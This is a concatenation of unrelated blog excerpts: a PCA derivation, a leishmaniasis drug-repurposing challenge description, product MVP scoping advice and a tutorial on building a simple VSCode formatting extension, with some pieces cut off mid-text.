    <img src="https://blog.ploeh.dk/content/binary/less-is-more-language-features-figure-07.png" alt="The set of all valid programs, inside the much larger set of all possible instructions, with the overlay of the set of possible instructions in a language without mutation.">
  </p>
  <p>
    Most languages don't completely take away this ability, but as Haskell (a Turing complete language) demonstrates, it's possible to write any program without implicit state mutation.
  </p>
  <p>
    At this point, many people might object that Haskell is too difficult and unintuitive, but to me, that kind of argumentation is reminiscent of the resistance to removing GOTO. If you are used to relying on GOTO, you have to learn alternative ways to model the same behaviour without GOTO. …</p></div></div>

As an individual contributor, career ladders tell me what the company ostensibly values (and, by omission, what it doesn't value).</p> <p>I recently compiled this list of career ladders and figured I would share it here.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>In this post, we’ll take a deep dive into PCA, from both a mathematical and implementation perspective.
We’ll derive the equation from the ground up, look at how we can compute it and finally end with what it can be used for. This post is primarily targeted at those with a basic understanding of PCA but want to know the assumptions it relies on, its properties and derive how it can be computed.</p>
<p>If you’re interested in the repository containing the Jupyter notebook from which this is derived, it’s 
<a href="https://github.com/ymohamedahmed/blog-posts/tree/master/pca" target="_blank" rel="noopener">here</a>.</p>
<h2 id="the-optimal-coding-perspective">The optimal coding perspective</h2>
<h3 id="finding-a-low-dimensional-representation">Finding a low dimensional representation</h3>
<p>PCA can be thought of as finding a low-dimensional representation of a set of vectors. Given points in an <em>n</em>-dimensional space, we might wish to find some new <em>k</em>-dimensional space (with <em>k</em> &lt; <em>n</em>) which captures as much of the <em>essence</em> of the original space as possible. The exact definition of capturing the ‘<em>essence</em>’ is subject to design, however, we can consider it from multiple perspectives.</p>


<p><img src="https://ymohamedahmed.github.io/post/pca/images/pca.svg"></p><h3 id="the-notion-of-reconstruction-error">The notion of reconstruction error</h3>
<p>If we take our low-dimensional representation and attempt to recover the original <em>n</em>-dimensional vector of each point, we could measure how much each point varies from its reconstruction. The difference between each reconstruction and the original, is one way of measuring the effectiveness of our new <em>k</em>-dimensional space and is the approach taken by PCA.  Naturally, this requires a definition of a <em>similarity</em> between two matrices. If we have a matrix $X$ of our original points and our reconstruction $X'$ then we can define the difference between them as a sum of the square of errors $\sum_{i,j} (X-X’)_{i,j}^2$.</p>
<p>This quantity is known as the <em>Frobenius</em> norm of the matrix $||X-X'||_F$ and is essentially an extension of the L2 ($||\mathbf{v}||_2^2 =  \sum_i \mathbf{v}_i^2 = \mathbf{v}^\top \mathbf{v}$) norm from vectors to matrices. It is just a fancy name for squaring every element in a matrix and taking their sum. Crucially, however, we can see that the Frobenius norm of a matrix, $A$, is precisely equivalent to $Tr[A^\top A]$ (see the illustration below).</p>


<figure>

    <figcaption>Showing the relationship between the Frobenius norm and trace operator: $||A||_F^2 = \text{Tr}(A^\top A)$</figcaption>
</figure> 

<p>As a result, our error of interest, can be computed as $Tr[(X-X’)^\top (X-X’)]$, this will come in handy since the trace operator comes with a bunch of neat tricks for manipulating the matrices involved.</p>
<h3 id="pca-assumptions">PCA Assumptions</h3>
<p>We’ve defined how we’re going to evaluate this reconstruction, but not at all the means of performing the coding or its inverse.</p>
<p>PCA chooses to implement both the encoding and decoding as a matrix multiplication. So we can think of PCA as finding a matrix $D$ that will transform our input, $X$ to our coded version $C$ by a matrix multiplication (i.e. $C = XD$).
The matrix, $X$, being our original data of $m$ rows and $n$ columns.</p>
<p>We might choose, however, to use some matrix, $D_k$ which reduces the number of dimensions of our data from $m$ to $k$. To make it easier, we can tag the matrix with the new number of dimensions. If this is the case, then $D_k$ is of size $n \times k$ and so that the resulting coding, $C$, is of size $m \times k$.</p>
<p>One of the most crucial assumptions made by PCA is that the transformation matrix, $D_k$, has <strong>orthonormal</strong> columns. Criticially, this does not, technically, make it an <strong>orthogonal</strong> matrix since it may not be square and the rows may not be orthonormal.</p>
<p>This assumption is useful since it simplifies the reconstruction process, in fact, $X'$ can be computed as $XD_kD_k^\top$, i.e. we can use the transpose of the encoding matrix to perform the decoding.</p>
<p>To understand exactly why the reconstruction can be performed by the transpose of the matrix let’s consider a code $\mathbf{z}$ which we’ve generated as $\mathbf{z}=\mathbf{D}\mathbf{x}$ and are decoding using $\mathbf{D}^\top$.</p>
<p>The reconstruction error is $(\mathbf{x}-\mathbf{D}^\top\mathbf{z})^\top(\mathbf{x}-\mathbf{D}^\top\mathbf{z}) = \mathbf{x}^\top\mathbf{x} - \mathbf{x}^\top\mathbf{D}^\top\mathbf{z}-\mathbf{z}^\top\mathbf{D}\mathbf{x} + \mathbf{z}^\top\mathbf{D}\mathbf{D}^\top\mathbf{z}$.</p>
<p>We can take the derivative with respect to the code $\mathbf{z}$, $\nabla_\mathbf{z} = -2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{z}$, which given the definition of $\mathbf{z}$ is equal to $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{D}\mathbf{x}$.</p>
<p>We defined our matrix to have orthonormal columns so we know that $\mathbf{D}^\top\mathbf{D} = \mathbf{I}$ because the dot product of each column with itself will be one. Hence, our gradient is  $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{I}\mathbf{x} = \mathbf{0}$. This tells us that our encoding/decoding system is at a stationary point in the reconstruction error. Note that this only tells us for an individual point that was encoded with a matrix that has orthonormal columns, decoding with the transpose is a good idea. It doesn’t tell us anything about how to pick $\mathbf{D}$ or what happens if you use it for multiple points.</p>
<p>Given these assumptions, we can reframe our problem as finding the coding matrix which minimises the reconstruction error.</p>
<p>This means that formally, for some given value $k$, we wish to discover the matrix $D_k^*$.</p>
<p>$$D_k^* = argmin_{D_k} ||X-X'||_F =  argmin_{D_k} ||X-XD_kD_k^\top||_F$$</p>
<h3 id="discovering-the-coding-function">Discovering the coding function</h3>
<p>Given that we wish to minimise the reconstruction error, let us attempt to discover the transformation precisely capable of this.</p>
<p>We’ll need a few tricks to get us there.</p>
<ul>
<li>$(A+B)^\top = A^\top + B^\top$</li>
<li>$(AB)^\top = B^\top A^\top$</li>
<li>$(A^\top)^\top = A$</li>
</ul>
<p>From the visual illustration, recall that we can write the reconstruction error as $\text{Tr}((X-XD_kD_k^\top)^\top(X-XD_kD_k^\top))$.</p>
<p>By using the rules  this can be expanded into $$\text{argmin}_{D_k}\text{Tr}(X^\top X -X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>We are, however, only interested in the effect of the matrix $D_k$ so we’ll axe the first term $$\text{argmin}_{D_k}\text{Tr}(-X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>Crucially, however, the trace operator has two useful properties for us:</p>
<ul>
<li>it’s insensitive to cyclic permutations (i.e. $\text{Tr}(ABC) = \text{Tr}(CAB) = \text{Tr}(BCA)$)</li>
<li>the trace of a sum of matrices is the sum of their traces (i.e $\text{Tr}(\sum_i \mathbf{A}_i) = \sum_i \text{Tr}(\mathbf{A}_i)$)</li>
</ul>
<p>Given this, we can write the equation of interest as: $$\text{argmin}_{D_k}-2\text{Tr}(-X^\top XD_kD_k^\top)+ \text{Tr}(D_kD_k^\top X^\top XD_kD_k^\top)$$.</p>
<p>Furthermore, since we define the columns of $D_k$ as being orthonormal, $\mathbf{D}_k^\top \mathbf{D}_k = \mathbf{I}$ and so we can rewrite the second term as $\text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$ which matches the form of the first term (from permuting it) and therefore can be written as the following maximisation.</p>
<p>$$\text{argmax}_{\mathbf{D}_k} \text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$$</p>
<p>This is sets up exactly the quantity that PCA is attempting to maximise.</p>
<h4 id="relationship-with-eigendecomposition">Relationship with eigendecomposition</h4>
<p>Having happily derived the maximisation problem, I’ll do my best to convince you that this is, in fact, maximised by having the k-columns of $\mathbf{D}_k$ as the k eigenvectors of $\mathbf{X}^\top\mathbf{X}$ with largest eigenvalues. This will roughly take the form of an inductive proof. So let’s start with considering $k=1$, that is if we had the choice of using a single vector, what would we go with?</p>
<h5 id="base-case">Base case</h5>
<p>We’ll use the lowercase, $\mathbf{d}$, to emphasise that it’s a vector rather than matrix. So let’s try and tackle:</p>
<p>$$\text{argmax}_{\mathbf{d}} \text{Tr}(\mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d})$$</p>
<p>The trace of a scalar, is defined as itself, so we wish to find $$\text{argmax}_{\mathbf{d}} \mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d}$$</p>
<p>However, recall that we mandated as our first assumption that the columns of $\mathbf{D}$ are orthonormal and hence we know that $\mathbf{d}^\top\mathbf{d} = 1$.</p>
<p>This allows us to reframe this as a constrained optimisation problem and use Lagrange multipliers to discover which vector minimises the quantity of interest whilst satisfying the norm constraint. For convenience, we’ll use $\mathbf{A} = \mathbf{X}^\top  \mathbf{X}$.</p>
<p>Hence we can write this as:
$$L(\mathbf{d}, \mathbf{A}, \lambda) = \mathbf{d}^\top \mathbf{A}\mathbf{d} - \lambda(\mathbf{d}^\top \mathbf{d} - 1)$$</p>
<blockquote>
<p>TL;DR Lagrange multipliers are just a technique for optimising a function over a specific region, in our case we’re not looking for all vectors but only ones with a norm of 1. We rewrite the function to include the constraint and take the derivative of the new function, known as the <em>Lagrangian</em>.</p>
</blockquote>
<p>By taking the derivative of $L$ we can find the solution.</p>
<p>$$\frac{\partial L}{\partial \mathbf{d}} = 2\mathbf{A}\mathbf{d} - 2\lambda\mathbf{d}$$</p>
<p>The derivative is precisely zero when $\mathbf{A}\mathbf{d} = \lambda\mathbf{d}$, that is when $\mathbf{d}$ is an eigenvector of the matrix $\mathbf{A}$.
Furthermore, we can see that the quantity in fact takes on the associated eigenvalue since $\mathbf{d}^\top \mathbf{A}\mathbf{d} = \mathbf{d}^\top \lambda\mathbf{d} = \lambda $, where $\lambda$ is the associated eigenvalue. This is always possible since we can mandate that the eigenvector has a unit norm.</p>
<p>Hence, we can see here that for the base case, the best vector is the eigenvector with the largest eigenvalue.</p>
<h5 id="inductive-step">Inductive step</h5>
<p>Having showcased our hypothesis for $k=1$, let’s see what happens for other values of $k$. Precisely, let us show that if our hypothesis is true for some arbitrary $k$ then it is also true for some $k+1$. That is the best encoding matrix with $k+1$ columns, consists of the $k+1$ unit eigenvectors with the largest associated eigenvalues.</p>
<p>We are now interested in the following problem.</p>
<p>$$\text{argmax}_{\mathbf{D}_{k+1}} \text{Tr}(\mathbf{D}_{k+1}^\top …</p></div></div>

<p>Leishmaniasis is a <a href="https://www.dndi.org/diseases-projects/leishmaniasis/">neglected disease</a>. As a disease of poverty, it has historically received <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3530408/">limited funding</a> for discovery, development and delivery of new tools. Current treatment is costly, lengthy, painful and sometimes toxic. Like a handful of similar diseases, it is the scourge of whole regions affected by them, because we still miss cheap, safe and effective cures for them.</p>
<p>At the same time, new drug candidates are being developed and old ones are being tested every day. Today, millions of drug activity assays are available at the press of a button. In this Indaba Grand Challenge, we dare to ask you to help identify amongst the already known, tested and (often) approved drugs, potential cures for different forms of leishmaniasis.</p>
<h2>Leishmaniasis</h2>

<p>Humanity has been remarkably successful in curing most of communicable diseases, be it of bacterial or viral origin. However, there remains a whole group of diseases that largely evade successful treatment – the ones transmitted by parasites. Large number of them is caused by a group of small, single-celled animals named <em><a href="https://www.dndi.org/wp-content/uploads/2018/12/Rao_Drugdiscoverykinetoplastiddiseases_ACSInfectiousDiseases_2019.pdf">kinetoplastids</a>. </em>They cause such diseases as African sleeping sickness (caused by <em>Trypanosoma brucei</em>), Chagas disease (<em>Trypanosoma cruzii</em>) and&nbsp; Leishmaniasis (different <em>Leishmania</em> species). </p>

<p>Leishmaniases (as it is a whole group of diseases), are spread by bites of sandflies and readily communicated between animals (such as dogs). Out of 30 species that attack animals, 21 affect humans. There are more than 350 million people in nearly 90 countries, that live in areas where leishmaniasis is common. Around 90% of its most dangerous variant – visceral leishmaniasis –&nbsp; is recorded&nbsp; in Bangladesh, Nepal, Sudan and Brazil, but disease is prevalent also in Mexico, South and Central America, Asia (excluding the South-East Asia), Middle East, southern Europe and Africa (in particular North and East Africa) .</p>

<p>Every year approximately 12 million people are afflicted with the disease, with over 2 million new cases each year, most of which is a cutaneous (skin) leishmaniasis (nearly 1.5 million), but nearly 25% comprises the most lethal, visceral variant. Parasite suppresses the host’s immune system to avoid eradication, which often leads to frequently lethal secondary respiratory infections.&nbsp; Yearly, approximately 50 thousand people die worldwide because of <em>Leishmania </em>caused diseases.  </p>
<p>Visceral leishmaniasis causes swelling, malaise, wasting, damages spleen and liver, as well as leads to characteristic graying of skin (hence the name <em>black fever</em>). The fever caused by the disease lasts for more than two weeks and does not abate with antimalarial drugs. The cutaneous type makes for wide-spread sores that can take over a year to heal, and lead to necrosis (dying of tissue). It leads to scars on the face, neck, arms and legs. The third, mucocutaneous type causes both skin and mucosal ulcers, leading to the damage of soft tissues and cartilage, predominantly of nose and mouth area. All types tend to co-occur with AIDS (approximately 1 in 60 AIDS patients in south of France suffers from leishmaniasis).</p>

<p> The treatment for visceral leishmaniasis is problematic and relies mostly on antibiotics, which have a variable success rate. The most commonly used non-antibiotic drugs, containing pentavalent antimony (such as sodium stibogluconate or meglumine antimonate) are toxic to the heart, kidneys, pancreas and bone marrow of the patient, leading to headaches, abdominal issues, vomiting and low levels of blood platelets. They also require a month-long treatment through injections, as medication does not work well if taken by mouth. There is no safe treatment for cutaneous leishmaniasis, that would work dependably, with fluconazole (an antifungal medication) and pentamidine (an antimicrobial used for other kinetoplastid diseases) being the most promising support medications. Miltefosine, the first promising oral treatment for visceral leishmaniasis, tends to be effective for cutaneous form, but has limited use, as it is known to cause birth defects. </p>
<p>In the recent years a massive drug discovery campaign has led to discovery of a new drug (codenamed GNF6702) and its analog (a new, improved version, named NITD689), which affect parasites ability to degrade unnecessary and damaged proteins. While these drugs seem to work against a wide range of pathogens (including these causing African sleeping sickness, Chagas disease and visceral leishmaniasis), they are not effective against the other leishmaniases. Additionally, there is an emerging mutation among the parasites, that already now renders the drug ineffective. Therefore, even though it is currently successful in the clinical trials, it will most likely not lead to the eradication of the disease.&nbsp;  </p>
<p>There is a dire need for a new, safe therapy for kinetoplastis, one that can be administered earlier, with lesser likelihood of bothersome side effects, one that could eradicate these diseases once and for all. Finding this therapy is the goal of this Indaba Grand Challenge, and literally lives are at stake. The approach to identify potential cure candidates is drug repurposing. </p>
<h2>What is Drug Repurposing?</h2>
<figure><img src="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg 910w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-300x198.jpg 300w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-768x508.jpg 768w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-85x56.jpg 85w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-234x155.jpg 234w" sizes="(max-width: 910px) 100vw, 910px"><figcaption>Photo Credit: pixabay.com</figcaption></figure>
<p>Drug repurposing is the act of researching if an existing drug can be used for new therapeutic purposes. It’s something that has been done for centuries. A large amount of medications on the market right now are used for multiple purposes: for instance, aspirin is a pain reliever and also a blood thinner, ibuprofen is also used for pain relief, and for reducing inflammations.</p>
<p>The high cost of research and development involved in finding new drugs means that most of these will be targeted to “First World” countries to generate returns.</p>
<p>For “neglected diseases” or “tropical diseases”, drug repurposing is used as a sort of universal strategy: it lowers the costs of research and production and the time needed for clinic trials, which is why you’ll find that many of these diseases use medication that was originally used for other illnesses.</p>
<h2>The Challenge </h2>
<p>Drug discovery methods and pipelines are well described and modular. Each can be decomposed into smaller pieces, which can be rearranged and modified. All of these pipelines rely heavily on knowledge representation, pattern detection and building of statistical models.</p>
<p>The goal of this Indaba Grand Challenge is to, through the use of standard techniques and publicly available data on drugs, drug targets and kinetoplastids (parasites causing amongst other leishmaniasis), identify either:</p>
<ul>
<li>Compounds among known, approved drugs which can target known drug targets in <em>Leishmania </em>(especially one of the 15 species known to cause the cutaneous type of disease)<em> </em>in addition to their official use.</li>
<li>Compounds among known, approved drugs with sufficiently similar targets in the goal organisms to the targets in kinetoplastids.</li>
</ul>
<p>Importantly, the verification of a drug-target interaction is possible and routinely done <em>in silico</em>. However, not all drug-target combinations can be verified, due to sheer combinatorial expansion and limited computational resources. In addition, the identification of similarities and analogies between known experimental data is far from trivial and, despite the existence of numerous approaches, cannot be solved by one statistical technique alone.</p>
<p>By launching this Grand Challenge, and true to the core values of Deep Learning Indaba, we aim to build a <strong>collaborative effort</strong>, joining experts and enthusiasts in machine learning and software engineering, with doctors, epidemiologists, medicinal chemists and policy experts, to create a <strong>synergistic effect at scale</strong>. Our vision, if it becomes true, is one where interesting discoveries of the community are taken up by the experts, and conclusions of the experts are fed back to the community to iteratively improve on its findings and make breakthroughs possible. <strong>No single person can do it perfectly, but through a joint effort, together we can. </strong></p>
<h2> Challenge Specs </h2>
<p><strong>Goal:</strong> Propose a new treatment, comprising an <em>Leishmania </em>protein (either from a defined species, or a protein present in the proteome of one or more of the <em>Leishmania </em>species) and a small molecule (or set of small molecules). Submission can be specified as:</p>
<ul>
<li>Small molecule (SMILES/SMARTS string or SDF file) and a protein name</li>
<li>PDB file with a structure of a target and a bound small molecule</li>
</ul>
<p><strong>Available resources: </strong>We have put together a list of available resources and additional material <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://deeplearningindaba.com/grand-challenges/leishmaniasis/resources/" target="_blank">here</a>.</p>

<h2>Who can apply?</h2>

The issue has to do with how new features and new products are defined. Regardless of the client’s experience building digital products, SaaS, mobile apps, web apps, the majority generally tend to screw this up. As a Product Design Consultant, I haven’t worked on one feature where I didn’t have to provide clarity to strip down and simplify the scope. The real issue is that the client tends to give little thought to the product scope (amount and complexity of features) for the first version and how it feeds into the second version, through user feedback and analytics data, and how that feeds into the third version. Whatever you think your Minimal Viable Product is, can be stripped much further down.</p><p>I have a few theories as to why clients make this mistake.&nbsp;</p><ul data-rte-list="default"><li><p>They’re too passionate and excited about the new feature or product, so there is a lot of attachment to the final product vision, which makes for emotional decision making</p></li><li><p>They have a really grand vision and they *think they’ve stripped down the scope to the core, when they haven’t</p></li><li><p>They think they have to build everything because of a bureaucratic reason</p></li><li><p>They think the user won’t like the feature or product, because the real value is in the combination of all of those features being in one place</p></li></ul><p>This mistake is important because building too much, too fast, will create a larger time frame between their starting point and their point of receiving positive feedback from users (qualitative feedback, product market fit, user analytics data or some KPI). This larger gap will lead to them running out of resources faster, whether it’s funding, or psychological motivation to continue.</p><p>I will use a couple of examples based on real clients I’ve worked with to explain my theory and how to go about the thinking.&nbsp;</p><p>1- The client was building a SaaS analytics dashboard for an enterprise use case. As with any data visualization dashboard, giving the user the ability to see an overview snapshot of data to answer their underlying business question is the primary goal, and the secondary goal is for them to dig deeper into specific data points to further uncover information that will guide their business decisions. The first step is to build the primary overview dashboard with the snapshot 30,000 ft view of the data and optimize that in the first version, then focusing on iterations. The second step is to build the deep dive views. If there is no interaction with the overview of the data because it’s deemed not interesting enough, because it’s answering the wrong business questions that the user doesn’t actually care about, then the deep dive views don’t matter, the user won’t try to dive deep into something irrelevant. The way to measure the interaction with the snapshot view of the data without having built the deep dive views was to allow click actions into that overview data, but just provide static deep dives, rather than fancy interactive deep dives that lead to more deep dives. In short, the secondary view, which in this case was the analytics deep dives, had to be stripped down a lot.</p><p>2- The client was building a social application. “We need the ability for users to comment, and for other users to respond to these comments via text, voice, and video.” If the initial user doesn’t comment, the corresponding feature of text, voice and video is utterly useless and literally unusable in the UI. So we built the initial comments section, measured the interaction using an analytics tool, or sometimes manually tracked what percentage of users left the initial comment. The idea was that if that percentage is high enough, we would continue with the rest of the product hypothesis, if it’s low, rethink the initial comment.</p><p>In short, design the core, core-core, like the actual core. Then strip it down further, and build it. And measure it, optimize it. And once it reaches a certain level, then you can start to build the rest, otherwise “the rest” will never be used, and won’t be given a fair chance to be measured.</p></div></div></div></div></div></div></div>]]>

<p>Under the hood VSCode is built with Electron. Electron is a software framework which allows for the development of desktop GUI applications using web technologies. It combines the Chromium rendering engine and the Node.js runtime. It was recently added to the <a href="https://openjsf.org/projects/">OpenJS Foundation</a>.</p>
<p>There are 2 types of processes inside Electron</p>
<ol>
<li>
<p>Main process</p>
<ul>
<li>only 1 run at a time</li>
<li>job to handle all the <em>Renderers</em></li>
</ul>
</li>
<li>
<p>Renderer process</p>
<ul>
<li>many running at once</li>
<li>represents a page with UI</li>
<li>job to run code</li>
</ul>
</li>
</ol>
<p>A basic example of creating a new node process (renderer) is a below.</p>
<div data-language="javascript"><pre><code><span>let</span> <span>{</span> fork <span>}</span> <span>=</span> <span>require</span><span>(</span><span>"child_process"</span><span>)</span>
<span>let</span> serverProcess <span>=</span> <span>fork</span><span>(</span>__dirname <span>+</span> <span>"/server.js"</span><span>)</span></code></pre></div>
<p>Messages are sent across processes via IPC (inter-process communication), this enables rendrer-to-renderer communication, bypassing the main process. The GUI's are Chromium web pages.</p>
<hr>

<p>VSCode has extensions which introduce more advanced functionality. As it is built with Electron it must conform to the process rules.</p>
<p>In VSCode all extensions run in a single <em>Renderer process</em> called the "extension host process" (process name <code>shared-process</code>, in task manager they are under <code>Code helper (renderer)</code>).</p>
<p>There seem to be 2 main types of VSCode extensions:</p>
<ol>
<li>The extension host proccess does all the work</li>
<li>
<p>The extension host process runs a "client" whose job is to spawn a "server" <em>Renderer process</em>, which will do most of the heavy lifting. The server communicates with the client.</p>
<ul>
<li>this is common for a Language Server</li>
<li>it is worth noting that only the "extension host process" can update the GUI.</li>
</ul>
<blockquote>
<p>You can see which process is running what task via the VSCode Process Explorer (CMD Palette "<em>Developer: Open Process Explorer</em>")</p>
</blockquote>
</li>
</ol>
<h2 id="type-2---language-servers"><a href="#type-2---language-servers" aria-label="type 2   language servers permalink"></a>Type 2 - Language Servers</h2>
<p>Language Servers are background tasks spawned by an extension for a specific purpose.</p>
<p>TypeScript and Eslint are both examples of extensions which run Language Servers for their compilers. This is so the "server" can do the majority amount of the processing in the background, and only needs to relay messages (e.g. diagnostics) to the "client". They are often configured to re-run on save. This produces a more performant "client". In general it is good practice to run linters under a Language Server.</p>
<p>There are several strong pros of using Language Servers:</p>
<ol>
<li>Persistent memory and caching - the server never dies so can maintain a cache in memory to perform faster compiles in future runs</li>
<li>Faster boot up times - the server is already running shrinking any boot-up wait time to practically 0.</li>
</ol>
<p>Finally it is worth noting that VSCode comes with its own <a href="https://microsoft.github.io/language-server-protocol/">"Language Server Protocol"</a> which makes the client/server communication easier. It is a JSON-RPC standard between the development tool and the language server.</p>
<p>See example architecture below.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/vscode-arch.png" alt="VSCode extension architecture"></p>
<p>There is a <a href="https://code.visualstudio.com/api/language-extensions/language-server-extension-guide">language server extension guide</a> available here. An extension must make use of <code>vscode-languageclient</code> to implement a language client and server.</p>
<h2 id="type-1---one-and-dones"><a href="#type-1---one-and-dones" aria-label="type 1   one and dones permalink"></a>Type 1 - "One-and-dones"</h2>
<p>For extensions which do not run a langauge server, a common term is "one-and-done".</p>
<p>Examples of this are Prettier and Mocha (non-watch mode). Where the extension/compiler runs once and then ends until it is called into action again, perhaps via a file save (assuming it respects your preference for <code>editor.formatOnSave</code>, which most extensions do).</p>
<p>They can be less performant than Langauge Server as no data or information is persisted and must run in its entirety each time. However:</p>
<ul>
<li>there is no complex communication required between server and client.</li>
<li>for something like Prettier which reformats the entire file, it would require sending a huge amount of data between the client and server, so doing it all on the main extension process in the long run might be more performant.</li>
</ul>
<hr>

<p>We are going to build a VSCode extension which will be a stripped down version of Prettier. It will run for 2 different scenarios.</p>
<h3 id="scenario-1"><a href="#scenario-1" aria-label="scenario 1 permalink"></a>Scenario 1</h3>
<h4 id="before"><a href="#before" aria-label="before permalink"></a>Before</h4>

<h4 id="after"><a href="#after" aria-label="after permalink"></a>After</h4>

<p>So for scenario 1 it will respect that no arguments are given and not change anything.</p>
<h3 id="scenario-2"><a href="#scenario-2" aria-label="scenario 2 permalink"></a>Scenario 2</h3>
<h4 id="before-1"><a href="#before-1" aria-label="before 1 permalink"></a>Before</h4>
<div data-language="javascript"><pre><code><span>myFunction</span><span>(</span>one<span>,</span> two<span>,</span> three<span>)</span></code></pre></div>
<h4 id="after-1"><a href="#after-1" aria-label="after 1 permalink"></a>After</h4>
<div data-language="text"><pre><code>myFunction(
  one,
  two,
  three
);</code></pre></div>
<p>So for scenario 2 it will recognise the arguments, format them correctly and update the code in our file.</p>
<h2 id="lets-get-started-"><a href="#lets-get-started-" aria-label="lets get started  permalink"></a>Lets get started 💪</h2>
<h3 id="1-json-setup"><a href="#1-json-setup" aria-label="1 json setup permalink"></a>1. JSON setup</h3>
<p>Add necessary setup to <code>package.json</code></p>
<div data-language="json"><pre><code>  <span>"main"</span><span>:</span> <span>"./src/extension"</span><span>,</span>
  <span>"publisher"</span><span>:</span> <span>"craig-vscode-extension"</span><span>,</span>

      <span>}</span>
    <span>]</span>
  <span>}</span><span>,</span></code></pre></div>
<p>This will</p>
<ul>
<li>tell VSCode the extension JavaScript can be found in <code>./src/extension</code></li>
<li>register our extension to run on activation (when it starts), see <code>activationEvents</code></li>
<li>tell VSCode to title our extension under <code>Sexify it</code> inside the VSCode command palette.</li>
</ul>
<p>Aswell as a simple launch file <code>.vscode/launch.json</code></p>
<div data-language="json"><pre><code><span>{</span>
  <span>"version"</span><span>:</span> <span>"0.2.0"</span><span>,</span>
  <span>"configurations"</span><span>:</span> <span>[</span>

    <span>}</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>This is so VSCode knows how to run our client.</p>
<h3 id="2-build-a-basic-text-replacement-extension"><a href="#2-build-a-basic-text-replacement-extension" aria-label="2 build a basic text replacement extension permalink"></a>2. Build a basic text replacement extension</h3>
<p>Inside <code>src/extension.js</code> add the below.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/activation-code.png" alt="Extension activation code"></p>
<p>Lets walk through what it is doing</p>
<ul>
<li>line 2 register our extension <code>"extension.SexifyIt"</code></li>
<li>line 6 grabs the current active editor</li>
<li>line 9 grabs all the document text</li>
<li>line 10 grabs the range details for the current selected text (it needs a range for the <code>replace</code> function)</li>
<li>line 13 calls our processing and reprinting function returning the new code, more on that in a moment</li>
<li>line 16/17 replaces the current selected range with our newly formatted code</li>
</ul>
<h3 id="3-ast-processing-and-reprinting"><a href="#3-ast-processing-and-reprinting" aria-label="3 ast processing and reprinting permalink"></a>3. AST processing and reprinting</h3>
<p>Inside the same file we define some AST utilities.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/ast-utils.png" alt="AST utilities"></p>
<ul>
<li>line 2-5 are simple character utilities</li>
<li>line 6 is a small function for an "Expression" statement (e.g. <code>myFunction()</code>)</li>
<li>the <code>Statements</code> object contains functions for each AST node type, with knowledge of how to "reprint" them i.e. turn AST back into JavaScript. It contains an <code>ExpressionStatement</code> and a <code>CallExpression</code>, which is what we need for our scenarios.</li>
</ul>
<p>The bulk of the processing is on line 21-28.</p>
<ul>
<li>grab number of arguments in function - line 21</li>
<li>if not greater than 0 (line 22) return as is</li>
<li>else we add a line break (line 23) and process each argument (line 26)</li>
<li>
<p>details of line 26:</p>
<ul>
<li>add an "indent" then the "argument name"</li>
<li>check if it is last argument, if not add a coma followed by a line break, else just add line break</li>
</ul>
</li>
<li>finally on line 29 we return an array of all the strings</li>
</ul>
<p>Our function would output the following from the above:</p>
<p><code>["myFunction", "(", "\n", " one,\n", " two,\n", " three\n", ")"]</code></p>
<p>It contains all the necessary code including the updated formatting. Notice the line breaks and indents.</p>
<h4 id="finally-the-code-to-kick-it-off"><a href="#finally-the-code-to-kick-it-off" aria-label="finally the code to kick it off permalink"></a>Finally the code to kick it off</h4>
<p><img src="https://craigtaub.dev/images/auto-formatting/parse-reprint.png" alt="AST utilities"></p>
<ul>
<li>
<p>line 2 we convert out function string into an AST object</p>
<ul>
<li>using a 3rd party tool called <code>abstract-syntax-tree</code> for this</li>
</ul>
</li>
<li>
<p>line 4 we map over each item in the <code>body</code></p>
<ul>
<li>the <code>body</code> is an array of each "block" (sometimes a line, sometimes an entire function)</li>
</ul>
</li>
<li>we call the <code>Statements</code> function for that AST node type (i.e. here will be <code>CallExpression</code>)</li>
<li>lastly on line 5 and 6 we flatten the new array and rejoin it so it becomes a string again.</li>
</ul>
<h2 id="checking-it-works"><a href="#checking-it-works" aria-label="checking it works permalink"></a>Checking it works</h2>
<p>So by running our extension in debugger mode (i.e. F5) we can open a file with our JavaScript in (example in <code>files/test.js</code>), highlight the code, open the "Command Palette" and find our "Sexify it" extension.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/sexify-it.png" alt="Our extension"></p>
<p>It will turn...</p>
<div data-language="javascript"><pre><code><span>myFunction</span><span>(</span>one<span>,</span> two<span>,</span> three<span>)</span></code></pre></div>
<p>Into this</p>
<div data-language="text"><pre><code>myFunction(
  one,
  two,
  three
);</code></pre></div>
<p>Confirming it works 👍. Converts our single-line function into multi-line with all the correct indents, exactly like Prettier does.</p>

<p>Thanks so much for reading or watching, I learnt a huge amount about VSCode and auto formatters from this research and I hope it was useful for you. You can find the repository for all this code <a href="https://github.com/craigtaub/our-own-prettier">here</a>.</p>
<p>Thanks, Craig 😃</p></div></div>]]>

<p><strong><em>TL;DR: Don’t trust AWS status reports, they’re misleading</em></strong></p>
